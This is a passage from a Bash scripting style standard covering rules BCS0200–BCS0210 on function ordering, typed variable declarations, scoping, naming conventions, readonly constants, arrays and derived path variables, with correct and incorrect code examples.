process_file() { validate_input "$1"; }  # Not defined yet!
validate_input() { ... }

# ✓ Correct - utilities first
validate_input() { ... }
process_file() { validate_input "$1"; }

# ✗ Wrong - random organization ignoring dependencies
cleanup() { ... }
build() { ... }
main() { ... }

# ✓ Correct - dependency order
check_deps() { ... }
build() { check_deps; ... }
main() { build; }

# ✗ Wrong - circular dependencies
function_a() { function_b; }
function_b() { function_a; }  # Circular!

# ✓ Correct - extract common logic
common_logic() { ... }
function_a() { common_logic; }
function_b() { common_logic; }
```

**Within-layer ordering:**

**Layer 1:** By severity: `_msg()` → `info()` → `success()` → `debug()` → `warn()` → `error()` → `die()`.

**Layer 3-5:** Alphabetically or by frequency/workflow order.

**Edge cases:**

**Circular dependencies:** Extract common logic to lower layer.

```bash
shared_validation() { ... }
function_a() { shared_validation; }
function_b() { shared_validation; }
```

**Sourced libraries:** Place after messaging layer.

```bash
info() { ... }
warn() { ... }
source "$SCRIPT_DIR/lib/common.sh"
validate_email() { ... }  # Can use both
```

**Private functions:** Place with public functions that use them.

```bash
_msg() { ... }  # Private
info() { >&2 _msg "$@"; }  # Public wrapper
```

**Summary:** Always organize bottom-up: messaging → utilities → validation → business → orchestration → main(). Dependencies flow downward. Use section comments. main() always last before invocation.


---


**Rule: BCS0200**

# Variable Declarations & Constants

This section establishes explicit variable declaration practices with type hints for clarity and safety. Covers type-specific declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`), variable scoping (global vs local), naming conventions (UPPER_CASE for constants, lower_case for variables), readonly patterns (individual and group), boolean flags using integers, and derived variables computed from other variables. These practices ensure predictable behavior and prevent common shell scripting errors.


---


**Rule: BCS0201**

## Type-Specific Declarations

**Always use explicit type declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`) to make variable intent clear and enable type-safe operations.**

**Rationale:**
- **Type Safety**: Integer `-i` enforces numeric operations; non-numeric becomes 0
- **Intent Documentation**: Types serve as inline documentation
- **Array Safety**: Prevents accidental scalar assignment breaking array operations
- **Scope Control**: `declare`/`local` provide precise scoping
- **Error Prevention**: Type mismatches caught early

### Declaration Types

**1. Integer (`declare -i`)** - Counters, exit codes, ports, flags, arithmetic variables
```bash
declare -i count=0
count=count+1     # Automatic arithmetic (no $(()) needed)
count='5 + 3'     # Evaluates to 8
count='abc'       # Evaluates to 0
```

**2. String (`declare --`)** - Paths, user input, config values, text data
```bash
declare -- filename='data.txt'
declare -- var_name='-weird'  # -- prevents option injection
```

**3. Indexed Array (`declare -a`)** - Lists, command arrays, sequential collections
```bash
declare -a files=()
files+=('file1.txt')
echo "${files[0]}"      # First element
echo "${files[@]}"      # All elements
echo "${#files[@]}"     # Count
for file in "${files[@]}"; do process "$file"; done
```

**4. Associative Array (`declare -A`)** - Key-value maps, configs, caching
```bash
declare -A config=([app_name]='myapp' [app_port]='8080')
echo "${config[app_name]}"   # Value by key
echo "${!config[@]}"         # All keys
[[ -v "config[app_port]" ]]  # Key exists check
for key in "${!config[@]}"; do echo "$key = ${config[$key]}"; done
```

**5. Read-only (`readonly --`)** - Constants: VERSION, SCRIPT_PATH, config values
```bash
readonly -- VERSION='1.0.0'
readonly -i MAX_RETRIES=3
readonly -a ALLOWED_ACTIONS=('start' 'stop' 'restart')
```

**6. Local (`local --`)** - ALL function variables (MANDATORY `--` separator)
```bash
process_file() {
  local -- filename="$1"    # ✓ Always use --
  local -i line_count       # ✓ Combine with type
  local -a lines
}
```

### Combining Type and Scope

```bash
declare -i GLOBAL_COUNT=0         # Global integer
declare -a PROCESSED_FILES=()     # Global array
declare -A FILE_STATUS=()         # Global associative array

count_files() {
  local -- dir="$1"
  local -i file_count=0
  local -a files=("$dir"/*)
  for file in "${files[@]}"; do
    [[ -f "$file" ]] && ((file_count+=1))
  done
  echo "$file_count"
}
```

### Anti-Patterns

```bash
# ✗ No type declaration (intent unclear)
count=0
# ✓ Explicit type
declare -i count=0

# ✗ Strings for numeric operations
max_retries='3'
if [[ "$attempts" -lt "$max_retries" ]]; then  # String comparison!
# ✓ Integers for numeric operations
declare -i max_retries=3
if ((attempts < max_retries)); then

# ✗ Missing -A for associative arrays
declare CONFIG
CONFIG[key]='value'  # Treats 'key' as 0!
# ✓ Explicit -A
declare -A CONFIG=()

# ✗ Global leak in functions
process_data() { temp_var="$1"; }
# ✓ Local variables
process_data() { local -- temp_var="$1"; }

# ✗ Missing -- separator
declare filename='-weird'  # Interpreted as option!
# ✓ Use -- separator
declare -- filename='-weird'

# ✗ Scalar assignment to array
declare -a files=()
files='file.txt'  # Overwrites array!
# ✓ Array assignment
files=('file.txt')  # Or: files+=('file.txt')
```

### Edge Cases

**Integer overflow:**
```bash
declare -i big_number=9223372036854775807  # Max 64-bit signed
((big_number+=1))  # Wraps to negative!
# For large numbers: declare -- big='99999999999999999999'; result=$(bc <<< "$big + 1")
```

**Associative arrays require Bash 4.0+:**
```bash
if ((BASH_VERSINFO[0] < 4)); then die 1 'Associative arrays require Bash 4.0+'; fi
```

**Array assignment syntax:**
```bash
declare -a arr1=()           # Empty array
declare -a arr2=('a' 'b')    # Two elements
declare -a arr4='string'     # ✗ Creates scalar, not array!
declare -a arr5=('string')   # ✓ Array with one element
```

**Nameref variables (Bash 4.3+):**
```bash
modify_array() {
  local -n arr_ref=$1  # Nameref
  arr_ref+=('new element')
}
declare -a my_array=('a' 'b')
modify_array my_array
echo "${my_array[@]}"  # a b new element
```

### Summary

| Type | Declaration | Use For |
|------|-------------|---------|
| Integer | `declare -i` | Counters, exit codes, ports |
| String | `declare --` | Paths, text, user input |
| Indexed array | `declare -a` | Lists, sequences |
| Associative array | `declare -A` | Key-value maps, configs |
| Constant | `readonly --` | Immutable values |
| Function-local | `local --` | ALL function variables |

Combine modifiers: `local -i`, `local -a`, `readonly -A`. **Always use `--` separator.**


---


**Rule: BCS0202**

## Variable Scoping

Always declare function-specific variables as `local` to prevent namespace pollution and unexpected side effects.

```bash
# Global variables - declare at top
declare -i VERBOSE=1 PROMPT=1

# Function variables - always use local
main() {
  local -a add_specs=()      # Local array
  local -i max_depth=3       # Local integer
  local -- path              # Local string
  local -- dir
  dir=$(dirname -- "$name")
  # ...
}
```

**Rationale:**
- Without `local`, variables become global and can overwrite same-named globals
- Variables persist after function returns, causing unexpected behavior
- Recursive function calls interfere with each other

**Anti-pattern:**
```bash
# ✗ Wrong - no local declaration
process_file() {
  file="$1"  # Overwrites any global $file variable!
}

# ✓ Correct - local declaration
process_file() {
  local -- file="$1"  # Scoped to this function only
}
```

**Edge case - recursive functions:**
```bash
# ✗ Wrong - global breaks recursion
count_files() {
  total=0  # Each recursive call resets it
  for file in "$1"/*; do total+=1; done
  echo "$total"
}

# ✓ Correct - each invocation gets its own total
count_files() {
  local -i total=0
  for file in "$1"/*; do total+=1; done
  echo "$total"
}
```


---


**Rule: BCS0203**

## Naming Conventions

Follow these naming conventions to maintain consistency and avoid conflicts with shell built-ins.

| Type | Convention | Example |
|------|------------|---------|
| Constants | UPPER_CASE | `readonly MAX_RETRIES=3` |
| Global variables | UPPER_CASE or CamelCase | `VERBOSE=1` or `ConfigFile='/etc/app.conf'` |
| Local variables | lower_case with underscores | `local file_count=0` |
|  | CamelCase acceptable for important locals | `local ConfigData` |
| Internal/private functions | prefix with _ | `_validate_input()` |
| Environment variables | UPPER_CASE with underscores | `export DATABASE_URL` |

**Examples:**
```bash
# Constants
readonly -- SCRIPT_VERSION='1.0.0'
readonly -- MAX_CONNECTIONS=100

# Global variables
declare -i VERBOSE=1
declare -- ConfigFile='/etc/myapp.conf'

# Local variables
process_data() {
  local -i line_count=0
  local -- temp_file
  local -- CurrentSection  # CamelCase for important variable
}

# Private functions
_internal_helper() {
  # Used only by other functions in this script
}
```

**Rationale:**
- UPPER_CASE for globals/constants makes scope immediately visible
- lower_case for locals distinguishes from globals, prevents shadowing
- Underscore prefix signals "internal use only"
- Avoid lowercase single-letter names (reserved for shell)
- Never reuse shell variable names (PATH, HOME, USER, etc.)


---


**Rule: BCS0204**

## Constants and Environment Variables

**Constants (readonly):**
```bash
# Use readonly for values that never change
readonly -- SCRIPT_VERSION='1.0.0'
readonly -- MAX_RETRIES=3
readonly -- CONFIG_DIR='/etc/myapp'

# Group readonly declarations
VERSION='1.0.0'
AUTHOR='John Doe'
LICENSE='MIT'
readonly -- VERSION AUTHOR LICENSE
```

**Environment variables (export):**
```bash
# Use declare -x (or export) for variables passed to child processes
declare -x ORACLE_SID='PROD'
declare -x DATABASE_URL='postgresql://localhost/mydb'

# Alternative syntax
export LOG_LEVEL='DEBUG'
export TEMP_DIR='/tmp/myapp'
```

**Rationale:**

`readonly` prevents modification and signals immutability. Use for script metadata (VERSION, AUTHOR, LICENSE), configuration paths determined at startup (CONFIG_DIR, DATA_DIR), and derived constants. `declare -x`/`export` makes variables available in child processes. Use for environment configuration (DATABASE_URL, API_KEY) and settings inherited by subshells (LOG_LEVEL).

| Feature | `readonly` | `declare -x` / `export` |
|---------|-----------|------------------------|
| Prevents modification |  Yes |  No |
| Available in subprocesses |  No |  Yes |
| Can be changed later |  Never |  Yes |
| Use case | Constants | Environment config |

**Combining both (readonly + export):**
```bash
# Make a constant that is also exported to child processes
declare -rx BUILD_ENV='production'
readonly -x MAX_CONNECTIONS=100

# Or in two steps
declare -x DATABASE_URL='postgresql://prod-db/app'
readonly -- DATABASE_URL
```

**Anti-patterns:**

```bash
#  Wrong - exporting constants unnecessarily
export MAX_RETRIES=3  # Child processes don't need this

#  Correct - only make it readonly
readonly -- MAX_RETRIES=3

#  Wrong - not making true constants readonly
CONFIG_FILE='/etc/app.conf'  # Could be accidentally modified later

#  Correct - protect against modification
readonly -- CONFIG_FILE='/etc/app.conf'

#  Wrong - making user-configurable variables readonly too early
readonly -- OUTPUT_DIR="$HOME/output"  # Can't be overridden by user!

#  Correct - allow override, then make readonly
OUTPUT_DIR="${OUTPUT_DIR:-$HOME/output}"
readonly -- OUTPUT_DIR
```

**Example:**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Script constants (not exported)
readonly -- SCRIPT_VERSION='2.1.0'
readonly -- MAX_FILE_SIZE=$((100 * 1024 * 1024))  # 100MB

# Environment variables for child processes (exported)
declare -x LOG_LEVEL="${LOG_LEVEL:-INFO}"
declare -x TEMP_DIR="${TMPDIR:-/tmp}"

# Combined: readonly + exported
declare -rx BUILD_ENV='production'

# Derived constants (readonly)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- SCRIPT_PATH SCRIPT_DIR
```


---


**Rule: BCS0205**

## Readonly After Group

**Declare variables with values first, then make them readonly together in a single statement. This prevents assignment errors, groups related constants visually, and makes immutability explicit.**

**Rationale:**
- Cannot assign to already-readonly variables
- Related constants visually grouped as logical unit
- Single readonly statement makes intent obvious
- Easy to maintain, separates initialization from protection

**Three-Step Progressive Readonly (runtime configuration/arguments):**

```bash
# Step 1 - Declare with defaults
declare -i VERBOSE=0 DRY_RUN=0
declare -- OUTPUT_FILE='' PREFIX='/usr/local'

# Step 2 - Parse and modify in main()
main() {
  while (($#)); do case $1 in
    -v) VERBOSE=1 ;;
    --prefix) noarg "$@"; shift; PREFIX="$1" ;;
  esac; shift; done

  # Step 3 - Make readonly AFTER parsing
  readonly -- VERBOSE DRY_RUN OUTPUT_FILE PREFIX

  ((VERBOSE)) && info "Using prefix: $PREFIX"
}
```

Variables must be mutable during parsing; making readonly too early prevents modification. Lock values after parsing completes.

**Script Metadata Exception:**

As of BCS v1.0.1, script metadata (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) prefers `declare -r` for immediate readonly declaration. Readonly-after-group remains valid but `declare -r` is recommended (see BCS0103). All other groups (colors, paths, config) use readonly-after-group.

```bash
# Metadata - uses declare -r (see BCS0103)
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Colors - readonly-after-group
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' NC=$'\033[0m'
else
  RED='' GREEN='' YELLOW='' NC=''
fi
readonly -- RED GREEN YELLOW NC
```

**Standard Groups:**

```bash
# Group 1: Script metadata (exception - uses declare -r)
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Group 2: Colors (conditional)
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m' GREEN=$'\033[0;32m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  RED='' GREEN='' CYAN='' NC=''
fi
readonly -- RED GREEN CYAN NC

# Group 3: Path constants
PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"
SHARE_DIR="$PREFIX/share/myapp"
readonly -- PREFIX BIN_DIR SHARE_DIR

# Group 4: Configuration defaults
DEFAULT_TIMEOUT=30
DEFAULT_RETRIES=3
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES
```

**Complete Example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script Metadata
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Colors
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m' GREEN=$'\033[0;32m' NC=$'\033[0m'
else
  RED='' GREEN='' NC=''
fi
readonly -- RED GREEN NC

# Paths
PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"
readonly -- PREFIX BIN_DIR

# Configuration
DEFAULT_TIMEOUT=30
readonly -- DEFAULT_TIMEOUT

# Mutable globals
declare -i VERBOSE=0 DRY_RUN=0
declare -- LOG_FILE=''

main() {
  # Parse arguments...
  [[ -n "$LOG_FILE" ]] && readonly -- LOG_FILE
  info "Starting $SCRIPT_NAME $VERSION"
}

main "$@"
#fin
```

**Anti-patterns:**

```bash
# � Valid but not preferred for metadata (use declare -r instead)
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
readonly -- VERSION SCRIPT_PATH

#  Preferred for metadata
declare -r VERSION='1.0.0'

#  Wrong - readonly before all values set
PREFIX='/usr/local'
readonly -- PREFIX  # Premature!
BIN_DIR="$PREFIX/bin"  # BIN_DIR not readonly

#  Correct - all values first, then readonly
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"
readonly -- PREFIX BIN_DIR

#  Wrong - missing -- separator
readonly PREFIX  # Risky if name starts with -

#  Correct - always use --
readonly -- PREFIX

#  Wrong - unrelated variables grouped
CONFIG_FILE='config.conf'
VERBOSE=1
readonly -- CONFIG_FILE VERBOSE  # Not logical group

#  Correct - group related variables
CONFIG_FILE='config.conf'
LOG_FILE='app.log'
readonly -- CONFIG_FILE LOG_FILE

#  Wrong - readonly inside conditional
if [[ -f config.conf ]]; then
  CONFIG_FILE='config.conf'
  readonly -- CONFIG_FILE  # Might not execute
fi

#  Correct - initialize with default, then readonly
CONFIG_FILE="${CONFIG_FILE:-config.conf}"
readonly -- CONFIG_FILE
```

**Derived Variables:**

Initialize in dependency order:

```bash
PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"
SHARE_DIR="$PREFIX/share"
readonly -- PREFIX BIN_DIR SHARE_DIR
```

**Arrays:**

```bash
declare -a REQUIRED_COMMANDS=('git' 'make' 'tar')
declare -a OPTIONAL_COMMANDS=('md2ansi' 'pandoc')
readonly -a REQUIRED_COMMANDS OPTIONAL_COMMANDS
# Or: readonly -- REQUIRED_COMMANDS OPTIONAL_COMMANDS
```

**Delayed Readonly (after argument parsing):**

```bash
declare -i VERBOSE=0 DRY_RUN=0
declare -- CONFIG_FILE='' LOG_FILE=''

main() {
  while (($#)); do case $1 in
    -v) VERBOSE=1 ;;
    -c) noarg "$@"; shift; CONFIG_FILE="$1" ;;
  esac; shift; done

  # Make readonly after parsing
  readonly -- VERBOSE DRY_RUN
  [[ -n "$CONFIG_FILE" ]] && readonly -- CONFIG_FILE
  [[ -n "$LOG_FILE" ]] && readonly -- LOG_FILE
}
```

**Testing Readonly Status:**

```bash
readonly -p | grep -q "VERSION" && echo "VERSION is readonly"
readonly -p  # List all readonly variables
VERSION='2.0.0'  # Fails: bash: VERSION: readonly variable
```

**When NOT to Use Readonly:**

```bash
# Don't make readonly if value changes during execution
declare -i count=0  # Modified in loops

# Only make readonly when value is final
config_file=''
# ...assignment logic...
[[ -n "$config_file" ]] && readonly -- config_file
```

**Summary:**
- Initialize first, readonly second
- Group related variables together
- Always use `--` separator
- Make readonly as soon as values are final
- Delayed readonly for arguments (after parsing)
- Makes immutability explicit and prevents accidental modification


---


**Rule: BCS0206**

## Readonly Declaration

Use `readonly` for constants to prevent accidental modification.

```bash
readonly -a REQUIRED=(pandoc git md2ansi)
#shellcheck disable=SC2155 # acceptable; if realpath fails then we have much bigger problems
readonly -- SCRIPT_PATH="$(realpath -- "$0")"
```


---


**Rule: BCS0207**

## Arrays

**Rule: BCS0207** (Merged from BCS0501 + BCS0502)

Array declaration, usage, and safe list handling.

---

#### Rationale

Arrays provide element preservation (boundaries maintained), no word splitting with `"${array[@]}"`, glob safety (wildcards preserved literally), and safe command construction with arbitrary arguments.

---

#### Declaration

```bash
# Indexed arrays (explicit declaration)
declare -a paths=()           # Empty array
declare -a colors=('red' 'green' 'blue')

# Local arrays in functions
local -a found_files=()

# Associative arrays (Bash 4.0+)
declare -A config=()
config['key']='value'
```

#### Adding Elements

```bash
paths+=("$1")                          # Append single
args+=("$arg1" "$arg2" "$arg3")        # Append multiple
all_files+=("${config_files[@]}")      # Append another array
```

#### Iteration

```bash
# ✓ Correct - quoted expansion, handles spaces
for path in "${paths[@]}"; do
  process "$path"
done

# ✗ Wrong - unquoted, breaks with spaces
for path in ${paths[@]}; do
```

#### Length and Checking

```bash
count=${#files[@]}                     # Get number of elements

if ((${#array[@]} == 0)); then         # Check if empty
  info 'Array is empty'
fi

((${#paths[@]})) || paths=('.')        # Set default if empty
```

#### Reading Into Arrays

```bash
IFS=',' read -ra fields <<< "$csv_line"           # Split by delimiter
readarray -t lines < <(grep pattern file)         # From command
mapfile -t files < <(find . -name "*.txt")
readarray -t config_lines < config.txt            # From file
```

#### Element Access

```bash
first=${array[0]}                      # Single element (0-indexed)
last=${array[-1]}                      # Last element (Bash 4.3+)
"${array[@]}"                          # All as separate words
"${array[*]}"                          # All as single word (rare)
"${array[@]:2}"                        # Slice from index 2
"${array[@]:1:3}"                      # 3 elements from index 1
```

---

#### Safe Command Construction

```bash
local -a cmd=('myapp' '--config' "$config_file")
((verbose)) && cmd+=('--verbose')
[[ -n "$output" ]] && cmd+=('--output' "$output")
"${cmd[@]}"                            # Execute safely
```

#### Collecting Arguments During Parsing

```bash
declare -a input_files=()
while (($#)); do
  case $1 in
    -*)  handle_option "$1" ;;
    *)   input_files+=("$1") ;;
  esac
  shift
done

for file in "${input_files[@]}"; do
  process_file "$file"
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted expansion causes word splitting
rm ${files[@]}
# ✓ Correct
rm "${files[@]}"

# ✗ Wrong - word splitting to create array
array=($string)
# ✓ Correct
readarray -t array <<< "$string"

# ✗ Wrong - [*] in iteration joins all elements
for item in "${array[*]}"; do
# ✓ Correct - [@] keeps elements separate
for item in "${array[@]}"; do
```

---

#### Operator Summary

| Operation | Syntax | Description |
|-----------|--------|-------------|
| Declare | `declare -a arr=()` | Create empty array |
| Append | `arr+=("value")` | Add element |
| Length | `${#arr[@]}` | Number of elements |
| All elements | `"${arr[@]}"` | Each as separate word |
| Single element | `"${arr[i]}"` | Element at index i |
| Last element | `"${arr[-1]}"` | Last element |
| Slice | `"${arr[@]:2:3}"` | 3 elements from index 2 |
| Indices | `"${!arr[@]}"` | All array indices |

**Key principle:** Always quote array expansions: `"${array[@]}"` to preserve spacing and prevent word splitting.

#fin


---


**Rule: BCS0208**

## Reserved for Future Use

**Rule: BCS0208**

---

Reserved placeholder for Variables & Data Types section expansion.

#### Purpose

- Maintains numerical sequence integrity for BCS codes
- Allows future additions without code renumbering
- Protects external references to BCS0208

#### Possible Future Topics

- Nameref variables (`declare -n`)
- Indirect variable expansion (`${!var}`)
- Variable attributes and introspection

**Status:** Reserved | **Version:** 1.0.0

#fin


---


**Rule: BCS0209**

## Derived Variables

**Derived variables are computed from base variables for paths, configurations, or composite values. Group them with section comments explaining dependencies, document hardcoded exceptions, and update all derived variables when base values change (especially during argument parsing).**

**Rationale:**

- **DRY Principle**: Single source of truth - change base value once, all derivations update automatically
- **Consistency**: When PREFIX changes, all dependent paths update together
- **Clarity**: Section comments make variable relationships explicit
- **Correctness**: Updating derived variables when base changes prevents subtle bugs where variables become desynchronized

**Simple derived variables:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX='/usr/local'
declare -- APP_NAME='myapp'

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# All paths derived from PREFIX
declare -- BIN_DIR="$PREFIX/bin"
declare -- LIB_DIR="$PREFIX/lib"
declare -- SHARE_DIR="$PREFIX/share"
declare -- DOC_DIR="$PREFIX/share/doc/$APP_NAME"

# Application-specific derived paths
declare -- CONFIG_DIR="$HOME/.$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR/config.conf"
declare -- CACHE_DIR="$HOME/.cache/$APP_NAME"
declare -- DATA_DIR="$HOME/.local/share/$APP_NAME"

main() {
  echo "Installation prefix: $PREFIX"
  echo "Binaries: $BIN_DIR"
  echo "Libraries: $LIB_DIR"
  echo "Documentation: $DOC_DIR"
}

main "$@"

#fin
```

**XDG Base Directory support with environment fallbacks:**

```bash
declare -- APP_NAME='myapp'

# XDG_CONFIG_HOME with fallback to $HOME/.config
declare -- CONFIG_BASE="${XDG_CONFIG_HOME:-$HOME/.config}"
declare -- CONFIG_DIR="$CONFIG_BASE/$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR/config.conf"

# XDG_DATA_HOME with fallback to $HOME/.local/share
declare -- DATA_BASE="${XDG_DATA_HOME:-$HOME/.local/share}"
declare -- DATA_DIR="$DATA_BASE/$APP_NAME"

# XDG_STATE_HOME with fallback to $HOME/.local/state (for logs)
declare -- STATE_BASE="${XDG_STATE_HOME:-$HOME/.local/state}"
declare -- LOG_DIR="$STATE_BASE/$APP_NAME"
declare -- LOG_FILE="$LOG_DIR/app.log"

# XDG_CACHE_HOME with fallback to $HOME/.cache
declare -- CACHE_BASE="${XDG_CACHE_HOME:-$HOME/.cache}"
declare -- CACHE_DIR="$CACHE_BASE/$APP_NAME"
```

**Updating derived variables when base changes:**

```bash
declare -- PREFIX='/usr/local'
declare -- APP_NAME='myapp'

declare -- BIN_DIR="$PREFIX/bin"
declare -- LIB_DIR="$PREFIX/lib"
declare -- SHARE_DIR="$PREFIX/share"
declare -- MAN_DIR="$PREFIX/share/man"
declare -- DOC_DIR="$PREFIX/share/doc/$APP_NAME"

# Update all derived paths when PREFIX changes
update_derived_paths() {
  BIN_DIR="$PREFIX/bin"
  LIB_DIR="$PREFIX/lib"
  SHARE_DIR="$PREFIX/share"
  MAN_DIR="$PREFIX/share/man"
  DOC_DIR="$PREFIX/share/doc/$APP_NAME"

  info "Updated paths for PREFIX=$PREFIX"
}

main() {
  while (($#)); do
    case $1 in
      --prefix)
        noarg "$@"
        shift
        PREFIX="$1"
        # IMPORTANT: Update all derived paths when PREFIX changes
        update_derived_paths
        ;;

      --app-name)
        noarg "$@"
        shift
        APP_NAME="$1"
        # DOC_DIR depends on APP_NAME, update it
        DOC_DIR="$PREFIX/share/doc/$APP_NAME"
        ;;

      *) die 22 "Invalid argument: $1" ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- PREFIX APP_NAME BIN_DIR LIB_DIR SHARE_DIR MAN_DIR DOC_DIR
}
```

**Complex derivations with multiple dependencies:**

```bash
declare -- ENVIRONMENT='production'
declare -- REGION='us-east'
declare -- APP_NAME='myapp'
declare -- NAMESPACE='default'

# ============================================================================
# Configuration - Derived Identifiers
# ============================================================================

# Composite identifiers derived from base values
declare -- DEPLOYMENT_ID="$APP_NAME-$ENVIRONMENT-$REGION"
declare -- RESOURCE_PREFIX="$NAMESPACE-$APP_NAME"
declare -- LOG_PREFIX="$ENVIRONMENT/$REGION/$APP_NAME"

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

declare -- CONFIG_DIR="/etc/$APP_NAME/$ENVIRONMENT"
declare -- LOG_DIR="/var/log/$APP_NAME/$ENVIRONMENT"
declare -- DATA_DIR="/var/lib/$APP_NAME/$ENVIRONMENT"

# Files derived from directories and identifiers
declare -- CONFIG_FILE="$CONFIG_DIR/config-$REGION.conf"
declare -- LOG_FILE="$LOG_DIR/$APP_NAME-$REGION.log"
declare -- PID_FILE="/var/run/$DEPLOYMENT_ID.pid"

# ============================================================================
# Configuration - Derived URLs
# ============================================================================

declare -- API_HOST="api-$ENVIRONMENT.example.com"
declare -- API_URL="https://$API_HOST/v1"
declare -- METRICS_URL="https://metrics-$REGION.example.com/$APP_NAME"
```

**Anti-patterns to avoid:**

```bash
#  Wrong - duplicating values instead of deriving
PREFIX='/usr/local'
BIN_DIR='/usr/local/bin'        # Duplicates PREFIX!
LIB_DIR='/usr/local/lib'

#  Correct - derive from base value
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"
LIB_DIR="$PREFIX/lib"

#  Wrong - not updating derived variables when base changes
main() {
  case $1 in
    --prefix)
      shift
      PREFIX="$1"
      # BIN_DIR and LIB_DIR are now wrong!
      ;;
  esac
}

#  Correct - update derived variables
main() {
  case $1 in
    --prefix)
      shift
      PREFIX="$1"
      BIN_DIR="$PREFIX/bin"     # Update derived
      LIB_DIR="$PREFIX/lib"
      ;;
  esac
}

#  Wrong - making derived variables readonly before base
BIN_DIR="$PREFIX/bin"
readonly -- BIN_DIR             # Can't update if PREFIX changes!
PREFIX='/usr/local'

#  Correct - make readonly after all values set
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"
# Parse arguments that might change PREFIX...
readonly -- PREFIX BIN_DIR

#  Wrong - inconsistent derivation
CONFIG_DIR='/etc/myapp'                  # Hardcoded
LOG_DIR="/var/log/$APP_NAME"             # Derived from APP_NAME

#  Correct - consistent derivation
CONFIG_DIR="/etc/$APP_NAME"
LOG_DIR="/var/log/$APP_NAME"

#  Wrong - circular dependency
VAR1="$VAR2"
VAR2="$VAR1"                             # Circular!

#  Correct - clear dependency chain
BASE='value'
DERIVED1="$BASE/path1"
DERIVED2="$BASE/path2"
```

**Edge cases:**

**1. Conditional derivation:**

```bash
# Different paths for development vs production
if [[ "$ENVIRONMENT" == 'development' ]]; then
  CONFIG_DIR="$SCRIPT_DIR/config"
  LOG_DIR="$SCRIPT_DIR/logs"
else
  CONFIG_DIR="/etc/$APP_NAME"
  LOG_DIR="/var/log/$APP_NAME"
fi

# Derived from environment-specific directories
CONFIG_FILE="$CONFIG_DIR/config.conf"
LOG_FILE="$LOG_DIR/app.log"
```

**2. Platform-specific derivations:**

```bash
# Detect platform
case "$(uname -s)" in
  Darwin)
    LIB_EXT='dylib'
    CONFIG_DIR="$HOME/Library/Application Support/$APP_NAME"
    ;;
  Linux)
    LIB_EXT='so'
    CONFIG_DIR="$HOME/.config/$APP_NAME"
    ;;
  *)
    die 1 'Unsupported platform'
    ;;
esac

# Derived from platform-specific values
LIBRARY_NAME="lib$APP_NAME.$LIB_EXT"
CONFIG_FILE="$CONFIG_DIR/config.conf"
```

**3. Hardcoded exceptions:**

```bash
# Most paths derived from PREFIX
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"
LIB_DIR="$PREFIX/lib"

# Exception: System-wide profile must be in /etc regardless of PREFIX
# Reason: Shell initialization requires fixed path for all users
PROFILE_DIR='/etc/profile.d'           # Hardcoded by design
PROFILE_FILE="$PROFILE_DIR/$APP_NAME.sh"
```

**4. Multiple update functions:**

```bash
# Update subset of derived variables
update_prefix_paths() {
  BIN_DIR="$PREFIX/bin"
  LIB_DIR="$PREFIX/lib"
  SHARE_DIR="$PREFIX/share"
}

update_app_paths() {
  CONFIG_DIR="/etc/$APP_NAME"
  LOG_DIR="/var/log/$APP_NAME"
  DATA_DIR="/var/lib/$APP_NAME"
}

update_all_derived() {
  update_prefix_paths
  update_app_paths

  # Files derived from directories
  CONFIG_FILE="$CONFIG_DIR/config.conf"
  LOG_FILE="$LOG_DIR/app.log"
}
```

**Summary:**

- **Group derived variables** with section comments explaining dependencies
- **Derive from base values** - never duplicate, always compute
- **Update when base changes** - call update functions during argument parsing
- **Document hardcoded exceptions** - explain why specific values don't derive
- **Environment fallbacks** - use `${XDG_VAR:-$HOME/default}` pattern
- **Make readonly last** - after all parsing and derivation complete
- **Clear dependency chain** - base � derived1 � derived2
- **Update functions** - centralize derivation logic when many variables depend on same base


---


**Rule: BCS0210**

## Parameter Expansion & Braces Usage

**Rule: BCS0210**

Use `"$var"` as default. Only use braces `"${var}"` when syntactically necessary—braces add visual noise without value when not required.

---

#### Parameter Expansion Operations

```bash
# Pattern removal
